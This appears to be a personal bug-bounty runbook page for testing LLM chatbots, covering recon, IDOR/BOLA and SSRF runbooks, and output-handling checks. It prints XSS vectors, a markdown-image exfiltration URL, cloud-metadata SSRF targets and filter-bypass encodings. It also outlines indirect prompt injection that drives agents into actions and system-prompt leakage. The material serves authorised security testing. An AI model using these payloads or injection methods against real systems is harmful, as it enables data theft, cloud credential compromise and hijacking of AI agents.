01

Recon & fingerprint

The visible widget hides the target. Get everything on a proxy and map the real API before touching the model.

Capture the plumbing

  • Proxy all traffic through Burp / Caido / mitmproxy — the UI is not the target, the API is.
  • Identify transport: REST, GraphQL, SSE, or WebSocket (streaming bots usually stream).
  • Map every endpoint: send, list, get, delete, rename, share, export, upload, feedback, regenerate.
  • Pull the frontend JS bundle — hunt endpoints, feature flags, model names, and leaked provider API keys.
  • Record auth: session cookie, JWT, API key, or unauthenticated.

Fingerprint model & capabilities

  • Refusal phrasing, token limits and error shapes leak the provider (OpenAI / Anthropic / Google / self-hosted).
  • Enumerate surface-expanding features: file upload, URL fetch / preview, code exec, tools/actions, memory, multi-tenant.
02

Classify the architecture

Your step one. Plain LLM vs RAG vs Agent — each unlocks a different bug class, and systems are often more than one.

Signals — RAG

  • Cites internal docs / KB / tickets, or answers private & recent data a base model couldn't know.
  • Test: ask for something only an ingested doc would contain vs. something generic — compare specificity.

Signals — Agent / tools

  • It does things: fetches a URL, runs math, looks up an order, queries live state.
  • Test: ask it to fetch a URL you control → a hit on your OOB listener means it has an HTTP tool (and maybe SSRF). One move classifies it and starts the SSRF test.
Once classified, prioritise RAG and/or Agent tracks — but always run app-layer, output-handling and disclosure checks regardless of type.
03

App-layer testing

The chatbot is still a web app. The LLM hype makes people skip the classics — that's your edge.

high-valueLLM06 Excessive AgencyBOLASSRF

Access control / IDOR / BOLA

  • Swap conversation_id / thread_id / message_id / file_id in get, history, delete, rename, share, export → read others' chats.
  • Share links: guessable, unexpired, or missing-authz /share/{token}?
  • Tenant isolation: can org A reach org B's conversations, files, or RAG docs?

Injection, SSRF, uploads, limits

  • Where does model output flow? Into SQL / NoSQL / shell / template / another API → steer it to emit a payload.
  • SSRF via URL-fetch / preview / image / RAG-ingest — 169.254.169.254, internal IPs, file://.
  • Upload: traversal, XXE (DOCX/SVG/PDF), SSRF/RCE via processors. See the File Upload module.
  • Denial-of-wallet: missing rate limits, max-token abuse, unbounded concurrency (if allowed).
  • CORS reflection + credentials; WebSocket origin/auth; GraphQL introspection & field authz.
04

Insecure output handling

Model output is untrusted input to the browser. How the UI renders it is a goldmine — and under-tested.

high-valueLLM05 Improper Output Handling
  • XSS via rendered markdown/HTML: steer output to <img src=x onerror=>, javascript: links, HTML that escapes the renderer.
  • Markdown image data-exfil: if it renders ![](https://you/?d=DATA) that's an exfil primitive — chain with indirect injection. Confirm on your OOB.
  • Stored reach: output reflected on shared-transcript pages, admin dashboards or emails → stored XSS hitting new victims.
05

Agent / tools & disclosure

Excessive agency + what leaks. Info disclosure, not banter — report the leak.

critical pathLLM06LLM07 System Prompt Leakage
  • Enumerate tools and their parameters; trigger a state-changing tool without authz or on another user's resource.
  • Parameter injection: steer get_order(id) to another user's ID — IDOR/SSRF through the tool call.
  • Indirect injection → action: ingested content that makes the agent do something (account takeover via agent).
  • Leaked provider API keys in the JS bundle — billed to the target, trivial to prove without abuse. crit
  • System-prompt leakage exposing rules, tool schemas, internal URLs or secrets; verbose errors with stack traces.
RB

Runbook — Conversation IDOR / BOLA

Read or modify another user's conversations, messages, files or share links. Pure web-app testing, no LLM knowledge required — one of the most recurring high-value chatbot bugs.

high → critLLM02 Sensitive InfoBroken Object-Level AuthBurp · Autorize
1

Baseline your own traffic

Two accounts — A (attacker), B (victim). Send a message as each and capture the get-conversation request. Note the object ID and its format.

A — legitimate request
GET /api/v1/conversations/6f2c9a41-7b3e-4d02-9c8a-1f0e2b3c4d5e HTTP/2
Host: chat.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVC...   # A's token
Cookie: session=A-SESSION

UUIDv4 = not enumerable but still test authz; sequential int / UUIDv1 = enumerable.

2

Swap the object ID, keep your own auth

In Repeater, replace the ID with B's while keeping A's token. B's content back → IDOR/BOLA.

A's token · B's object → does it leak?
GET /api/v1/conversations/a1b2c3d4-victim-conversation-id HTTP/2
Host: chat.target.com
Authorization: Bearer eyJ...A-TOKEN...          # still A

# 200 + B's messages  → IDOR confirmed
# 403 / 404           → authz enforced, move on
3

Cover every verb & sibling endpoint

replay each with a foreign ID
GET    /api/v1/conversations/{id}              # read transcript
GET    /api/v1/conversations/{id}/messages     # full history
PATCH  /api/v1/conversations/{id}              # rename / tamper
DELETE /api/v1/conversations/{id}              # destroy
POST   /api/v1/conversations/{id}/share        # force-share
GET    /api/v1/conversations/{id}/export       # bulk pull
GET    /api/v1/files/{file_id}                 # attachment IDOR
Share links are their own bug: test /share/{token} unauthenticated, whether tokens are short/sequential/guessable, and whether they ever expire.
4

Automate the auth diff with Autorize

Autorize setup
# 1 Paste user B's token/cookie into Autorize (the low-priv identity).
# 2 Browse the whole app as user A.
# 3 Autorize replays each A-request with B's identity and diffs:
     green "Bypassed!"   → missing object-level authz
     grey  "Enforced!"   → ok
     orange "Is enforced??" → verify manually
Intruder — enumerate integer IDs
GET /api/v1/conversations/§1000§ HTTP/2
Authorization: Bearer eyJ...A-TOKEN...
# payload: numbers · grep distinct user data · flag differing 200s
5

Prove impact, then stop

Evidence = victim-specific content your account could never see (their message text, their email). Screenshot the request/response, redact real PII, state scope. Don't mass-enumerate real users — one clean cross-account read proves it.

RB

Runbook — SSRF via URL-fetch & tools

Make the server request internal or attacker-chosen destinations via any fetch/preview/ingest feature — or through an agent's URL tool. Often chains straight to cloud-metadata credential theft.

criticalLLM06 Excessive AgencyCollaborator / interactsh
1

Find the sink

Any feature that makes the backend reach a URL: "summarise this link", link unfurl/preview, image-from-URL / avatar, RAG "ingest this URL", webhook config, or an agent fetch_url tool.

2

Confirm the fetch with OOB

bait the fetch
POST /api/v1/chat HTTP/2
Content-Type: application/json

{"message": "summarise https://a1b2c3.oastify.com/ssrf"}
DNS + HTTP hit on your listener = server-side fetch confirmed. Record the source IP and User-Agent — they reveal cloud infra, an egress proxy, or the fetch library.
3

Pivot inward

internal targets
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP  (header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
# Azure (header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# internal services / schemes
http://127.0.0.1:8080/ · http://localhost/admin · file:///etc/passwd
4

Bypass allow-lists

filter bypasses
http://2130706433/    (decimal 127.0.0.1)
http://0x7f000001/    (hex)
http://[::ffff:169.254.169.254]/
http://127.0.0.1.nip.io/  ·  http://localhost./
http://169.254.169.254@your.com/  ·  http://your.com#@169.254.169.254/
# or: your server 302-redirects to the internal target
5

Read the response back & escalate responsibly

If the bot echoes fetched content, ask for it — the model reads the internal response straight back. Capture the OOB log + reflected body, redact live credentials, note the chain (SSRF → metadata → cloud takeover) as impact without actually pivoting.

Denial-of-wallet cousin: a fetch with no size/redirect cap can be pointed at a huge file or a redirect loop — only test if the program allows it.

About & deploy

A personal field runbook for bug bounty and pentesting — the hand-written chatbot/LLM methodology plus 1000+ checks across Web (incl. modern Node/React/SSR and server-side), API, Cloud (AWS/Azure), Android, iOS, Thick Client and OT/ICS. Everything is client-side; your checkbox progress, theme and scope live in your browser only.

How to use it

  • Categories → modules in the sidebar: Web, Android, iOS, Thick Client, Cloud, OT. Click a category for its landing cards, or a module to open its checklist.
  • Scope filter (top bar): Bug Bounty hides low-value config/hygiene items; Pentest shows everything (cookie flags, user enumeration, missing headers, TLS…); All = no filter.
  • Stack tags (PHP · Node · React · .NET …) flag where a technique or payload changes by stack — filter by them inside a module.
  • Per-module search + severity chips; tick items to track progress (saved in localStorage).
